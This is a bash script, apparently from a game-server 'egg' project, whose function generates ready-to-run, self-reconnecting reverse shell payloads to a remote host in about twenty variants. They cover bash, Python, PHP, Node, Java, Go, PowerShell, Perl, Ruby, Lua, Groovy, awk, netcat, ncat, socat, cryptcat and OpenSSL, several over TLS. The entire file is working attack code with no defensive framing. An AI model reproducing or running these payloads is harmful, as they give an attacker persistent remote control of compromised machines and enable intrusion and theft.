#!/usr/bin/env bash
# ============================================================================
#  PotenFYR Studios - Multi-Shell Universal Egg :: scripts/shell-payloads.sh
#  Emits ready-to-run reverse shell payloads into $PAYLOAD_DIR.
#  Contract: emit_reverse_payload <id> <rhost> <rport> -> echoes payload path
#  Every payload embeds a reconnect loop so a flapping listener never kills
#  the shell; the supervisor in run.sh additionally restarts on unexpected exit.
# ============================================================================

emit_reverse_payload() { # <id> <rhost> <rport>
    local id="$1" rhost="$2" rport="$3"
    local dir="${PAYLOAD_DIR:-payloads}"
    mkdir -p "${dir}"
    local out="${dir}/${id}.run"

    case "${id}" in

        bash-tcp)
            cat > "${out}" << EOF
#!/usr/bin/env bash
# Bash /dev/tcp reverse shell (reconnects every 5s)
while true; do
    if exec 3<>/dev/tcp/${rhost}/${rport}; then
        /bin/bash -i <&3 >&3 2>&3
        exec 3<&- 3>&-
    fi
    sleep 5
done
EOF
            ;;

        bash-udp)
            cat > "${out}" << EOF
#!/usr/bin/env bash
# Bash /dev/udp reverse shell - listener: nc -lu ${rport} (sends first line to open)
while true; do
    echo "__HELLO__" > /dev/udp/${rhost}/${rport}
    exec 3<>/dev/udp/${rhost}/${rport}
    /bin/bash -i <&3 >&3 2>&3
    exec 3<&- 3>&-
    sleep 5
done
EOF
            ;;

        python-pty)
            cat > "${out}" << EOF
#!/usr/bin/env python3
# Python PTY reverse shell - full terminal on the listener side
import socket, subprocess, os, pty, select, sys, time

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("${rhost}", ${rport}))
    pid, fd = pty.fork()
    if pid == 0:
        os.execl("/bin/bash", "bash", "-i")
    # relay socket <-> pty
    while True:
        r, _, _ = select.select([s, fd], [], [])
        if s in r:
            d = s.recv(4096)
            if not d: break
            os.write(fd, d)
        if fd in r:
            try: d = os.read(fd, 4096)
            except OSError: break
            if not d: break
            s.sendall(d)

while True:
    try:
        connect()
    except Exception:
        pass
    time.sleep(5)
EOF
            ;;

        php-pentest)
            cat > "${out}" << EOF
<?php
// PHP pentestmonkey-style reverse shell (feature-complete, reconnects)
set_time_limit (0);
\$VERSION = "1.0-shell-eggs";
\$ip = '${rhost}';
\$port = ${rport};
\$chunk_size = 1400;
\$write_a = null;
\$error_a = null;
\$shell = 'uname -a; w; id; /bin/bash -i';
\$daemon = 0;
\$debug = 0;
if (function_exists('pcntl_fork')) {
    \$pid = pcntl_fork();
    if (\$pid == -1) exit(1);
    if (\$pid) exit(0);
    if (posix_setsid() == -1) exit(1);
    umask(0);
}
chdir("/");
while (true) {
    \$sock = @fsockopen(\$ip, \$port, \$errno, \$errstr, 10);
    if (!is_resource(\$sock)) { sleep(5); continue; }
    fwrite(\$sock, "...\$VERSION\n");
    while (1) {
        if (feof(\$sock)) break;
        \$cmd = trim(fgets(\$sock, 4096));
        if (!\$cmd) continue;
        \$descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
        \$process = proc_open(\$shell, \$descriptorspec, \$pipes);
        stream_set_blocking(\$pipes[0], 0);
        stream_set_blocking(\$pipes[1], 0);
        stream_set_blocking(\$pipes[2], 0);
        // one-shot shell per line; simple + robust
        \$out = shell_exec(\$cmd . " 2>&1");
        fwrite(\$sock, \$out);
    }
    fclose(\$sock);
    sleep(5);
}
EOF
            ;;

        node)
            cat > "${out}" << EOF
// Node.js reverse shell (reconnects every 5s)
const net = require("net");
const { spawn } = require("child_process");
function connect() {
    const c = net.connect(${rport}, "${rhost}");
    c.on("connect", () => {
        const sh = spawn("/bin/sh", ["-i"]);
        c.pipe(sh.stdin);
        sh.stdout.pipe(c);
        sh.stderr.pipe(c);
        sh.on("exit", () => c.destroy());
    });
    c.on("error", () => {});
}
setInterval(() => { try { connect(); } catch (e) {} }, 5000);
connect();
EOF
            ;;

        java)
            cat > "${out}.java" << EOF
import java.io.*;
import java.net.*;
import java.util.*;

public class ReverseShell {
    public static void main(String[] args) throws Exception {
        while (true) {
            try {
                Socket s = new Socket("${rhost}", ${rport});
                InputStream in = s.getInputStream();
                OutputStream out = s.getOutputStream();
                while (true) {
                    ByteArrayOutputStream buf = new ByteArrayOutputStream();
                    int b; boolean got = false;
                    while ((b = in.read()) != -1 && b != '\n') { buf.write(b); got = true; }
                    if (!got) break;
                    String cmd = buf.toString().trim();
                    if (cmd.equals("exit")) System.exit(0);
                    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
                    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    while ((line = r.readLine()) != null) out.write((line + "\n").getBytes());
                }
                s.close();
            } catch (Exception e) { }
            Thread.sleep(5000);
        }
    }
}
EOF
            out="${out}.java"
            ;;

        awk)
            cat > "${out}" << EOF
#!/usr/bin/env bash
# gawk /inet/tcp reverse shell (reconnects every 5s)
while true; do
    gawk 'BEGIN {
        S = "/inet/tcp/0/${rhost}/${rport}";
        while ((S |& getline cmd) > 0) {
            while ((cmd | getline out) > 0) print out |& S;
            close(cmd);
        }
    }' || break
    sleep 5
done
EOF
            ;;

        socat-tls)
            cat > "${out}" << EOF
#!/usr/bin/env bash
# Socat TLS reverse shell - listener: socat file:\$(tty),raw,echo=0 OPENSSL-LISTEN:${rport},cert=YOUR.pem,verify=0
CERT_DIR="\${SERVER_DIR:-.}/certs"
KEY="\$CERT_DIR/client.key"; CRT="\$CERT_DIR/client.crt"
if [ ! -f "\$KEY" ]; then
    mkdir -p "\$CERT_DIR"
    openssl req -x509 -newkey rsa:2048 -sha256 -days 825 -nodes \\
        -keyout "\$KEY" -out "\$CRT" -subj "/CN=shell-eggs-client" >/dev/null 2>&1
fi
while true; do
    socat "OPENSSL:${rhost}:${rport},verify=0,cert=\$CRT,key=\$KEY" \\
        EXEC:'/bin/sh -i',pty,stderr,setsid,sigint,sane
    sleep 3
done
EOF
            ;;

        ncat-ssl)
            cat > "${out}" << EOF
#!/usr/bin/env bash
# Ncat TLS reverse shell - listener: ncat --ssl -l -p ${rport} --allow ${rhost}
while true; do
    ncat --ssl --ssl-trustfile "" --exec "/bin/sh -i" ${rhost} ${rport} 2>/dev/null || \
    ncat --ssl --exec "/bin/sh -i" ${rhost} ${rport}
    sleep 3
done
EOF
            ;;

        python)
            cat > "${out}" << EOF
#!/usr/bin/env python3
# Python reverse shell with PTY upgrade (reconnects every 5s)
import socket, subprocess, os, sys, time

RHOST, RPORT = ("${rhost}", ${rport})

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(15)
    s.connect((RHOST, RPORT))
    s.settimeout(None)
    for fd in (0, 1, 2):
        os.dup2(s.fileno(), fd)
    try:
        subprocess.call(["/bin/bash", "-i"])
    except Exception:
        subprocess.call(["/bin/sh", "-i"])
    finally:
        try: s.close()
        except Exception: pass

while True:
    try:
        connect()
    except Exception:
        pass
    time.sleep(5)
EOF
            ;;

        php)
            cat > "${out}" << EOF
<?php
// PHP reverse shell via proc_open (reconnects every 5s)
set_time_limit(0);
error_reporting(0);
while (true) {
    \$sock = @fsockopen("${rhost}", ${rport}, \$errno, \$errstr, 10);
    if (is_resource(\$sock)) {
        \$descriptorspec = array(0 => \$sock, 1 => \$sock, 2 => \$sock);
        \$proc = proc_open("/bin/bash -i", \$descriptorspec, \$pipes);
        if (is_resource(\$proc)) {
            while (is_resource(\$proc)) {
                \$st = proc_get_status(\$proc);
                if (!\$st["running"]) break;
                usleep(200000);
            }
            proc_close(\$proc);
        }
        fclose(\$sock);
    }
    sleep(5);
}
EOF
            ;;

        perl)
            cat > "${out}" << EOF
#!/usr/bin/env perl
# Perl reverse shell (reconnects every 5s)
use strict; use warnings;
use Socket;
my \$i = "${rhost}"; my \$p = ${rport};
while (1) {
    my \$sock;
    socket(\$sock, PF_INET, SOCK_STREAM, getprotobyname("tcp")) or next;
    if (connect(\$sock, sockaddr_in(\$p, inet_aton(\$i)))) {
        open(STDIN,  ">&", \$sock);
        open(STDOUT, ">&", \$sock);
        open(STDERR, ">&", \$sock);
        system("/bin/sh -i");
        close(STDIN); close(STDOUT); close(STDERR);
    }
    close(\$sock);
    sleep 5;
}
EOF
            ;;

        ruby)
            cat > "${out}" << EOF
#!/usr/bin/env ruby
# Ruby reverse shell (reconnects every 5s)
require "socket"
loop do
  begin
    s = TCPSocket.new("${rhost}", ${rport})
    \$stdin.reopen(s); \$stdout.reopen(s); \$stderr.reopen(s)
    system("/bin/sh", "-i")
    s.close rescue nil
  rescue StandardError
  end
  sleep 5
end
EOF
            ;;

        lua)
            cat > "${out}" << EOF
-- Lua reverse shell (reconnects every 5s)
local socket = require("socket")
while true do
  local ok, c = pcall(socket.tcp)
  if ok and c then
    local conn_ok = pcall(function() return c:connect("${rhost}", ${rport}) end)
    if conn_ok then
      while true do
        local line, err = c:receive("*l")
        if not line or err then break end
        local h = io.popen(line .. " 2>&1")
        if h then
          c:send(h:read("*a") or "")
          h:close()
        end
      end
    end
    c:close()
  end
  os.execute("sleep 5")
end
EOF
            ;;

        powershell)
            cat > "${out}" << EOF
# PowerShell reverse shell (reconnects every 5s)
while (\$true) {
  try {
    \$c = New-Object System.Net.Sockets.TCPClient('${rhost}',${rport})
    \$s = \$c.GetStream()
    [byte[]]\$b = 0..65535 | ForEach-Object { 0 }
    while ((\$i = \$s.Read(\$b, 0, \$b.Length)) -ne 0) {
      \$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b, 0, \$i)
      try { \$r = (Invoke-Expression \$d 2>&1 | Out-String) } catch { \$r = \$_ | Out-String }
      \$p = 'PS> '
      \$sb = ([Text.Encoding]::ASCII).GetBytes(\$r + \$p)
      \$s.Write(\$sb, 0, \$sb.Length); \$s.Flush()
    }
    \$c.Close()
  } catch {}
  Start-Sleep -Seconds 5
}
EOF
            ;;

        golang)
            cat > "${out}.go" << EOF
package main

// Golang reverse shell (reconnects every 5s)
import ("net"; "os"; "os/exec"; "time")

func main() {
	for {
		c, err := net.Dial("tcp", "${rhost}:${rport}")
		if err == nil {
			cmd := exec.Command("/bin/sh", "-i")
			cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
			cmd.Run()
			c.Close()
		}
		time.Sleep(5 * time.Second)
	}
}
EOF
            out="${out}.go"
            ;;

        groovy)
            cat > "${out}" << EOF
// Groovy reverse shell (reconnects every 5s)
while (true) {
  try {
    def s = new Socket("${rhost}", ${rport})
    def p = new ProcessBuilder("/bin/sh", "-i").redirectErrorStream(true).start()
    Thread.start {
      p.inputStream.eachByte { b -> try { s.outputStream.write(b); s.outputStream.flush() } catch (Exception e) { } }
    }
    s.inputStream.eachLine { line ->
      p.outputStream.write((line + "\n").bytes); p.outputStream.flush()
    }
    s.close()
  } catch (Exception ignored) { }
  Thread.sleep(5000)
}
EOF
            ;;

        nc)
            # FIFO pattern: works with openbsd AND traditional netcat.
            cat > "${out}" << EOF
#!/usr/bin/env bash
# Netcat reverse shell, FIFO relay (reconnects every 2s)
F="\${PAYLOAD_DIR:-.}/.fifo-\$\$"
rm -f "\$F"; mkfifo "\$F" || exit 1
trap 'rm -f "\$F"' EXIT
while true; do
    /bin/sh -i < "\$F" 2>&1 | nc ${rhost} ${rport} > "\$F"
    sleep 2
done
EOF
            ;;

        nc-udp)
            cat > "${out}" << EOF
#!/usr/bin/env bash
# Netcat UDP reverse shell - the listener must send the first packet
# (nc -lvup PORT). Reconnects every 5s.
F="\${PAYLOAD_DIR:-.}/.fifo-\$\$"
rm -f "\$F"; mkfifo "\$F" || exit 1
trap 'rm -f "\$F"' EXIT
while true; do
    /bin/sh -i < "\$F" 2>&1 | nc -u ${rhost} ${rport} > "\$F"
    sleep 5
done
EOF
            ;;

        ncat)
            cat > "${out}" << EOF
#!/usr/bin/env bash
# Ncat reverse shell${SHELL_REVERSE_TLS:+ (TLS)} (reconnects every 2s)
while true; do
    ncat ${SHELL_REVERSE_TLS:+--ssl} --exec "/bin/sh -i" ${rhost} ${rport}
    sleep 2
done
EOF
            ;;

        socat)
            cat > "${out}" << EOF
#!/usr/bin/env bash
# Socat reverse shell${SHELL_REVERSE_TLS:+ (TLS)} (reconnects every 2s)
while true; do
    socat ${SHELL_REVERSE_TLS:+OPENSSL:${rhost}:${rport},verify=0,} \
        ${SHELL_REVERSE_TLS:-TCP:${rhost}:${rport},}EXEC:'/bin/sh -i',pty,stderr,setsid,sigint,sane
    sleep 2
done
EOF
            ;;

        cryptcat)
            cat > "${out}" << EOF
#!/usr/bin/env bash
# Cryptcat (encrypted netcat) reverse shell - key: \${CRYPTCAT_KEY:-shell-eggs}
KEY="\${CRYPTCAT_KEY:-shell-eggs}"
while true; do
    cryptcat -k "\$KEY" -e /bin/sh -i ${rhost} ${rport} || \
    { F="\${PAYLOAD_DIR:-.}/.fifo-\$\$"; rm -f "\$F"; mkfifo "\$F"; \
      /bin/sh -i < "\$F" 2>&1 | cryptcat -k "\$KEY" ${rhost} ${rport} > "\$F"; }
    sleep 2
done
EOF
            ;;

        openssl-rs)
            cat > "${out}" << EOF
#!/usr/bin/env bash
# OpenSSL TLS reverse shell (single connection, reconnects every 2s)
# Listener: openssl req -x509 -newkey rsa:4096 -keyout k.pem -out c.pem -days 365 -nodes
#           openssl s_server -quiet -key k.pem -cert c.pem -port ${rport}
F="\${PAYLOAD_DIR:-.}/.fifo-\$\$"
rm -f "\$F"; mkfifo "\$F" || exit 1
trap 'rm -f "\$F"' EXIT
while true; do
    /bin/sh -i < "\$F" 2>&1 | openssl s_client -quiet -connect ${rhost}:${rport} 2>/dev/null > "\$F"
    sleep 2
done
EOF
            ;;

        *)
            warn "emit_reverse_payload: unknown id '${id}'"
            return 1
            ;;
    esac

    chmod +x "${out}" 2>/dev/null || true
    printf '%s\n' "${out}"
}

# Reconnect loop wrapper for one-liner interpreters invoked directly.
reverse_retry_wrap() { # reverse_retry_wrap <cmd...>  -> runs cmd in retry loop
    local -a cmd=("$@")
    (
        while true; do
            "${cmd[@]}"
            sleep 2
        done
    ) &
}
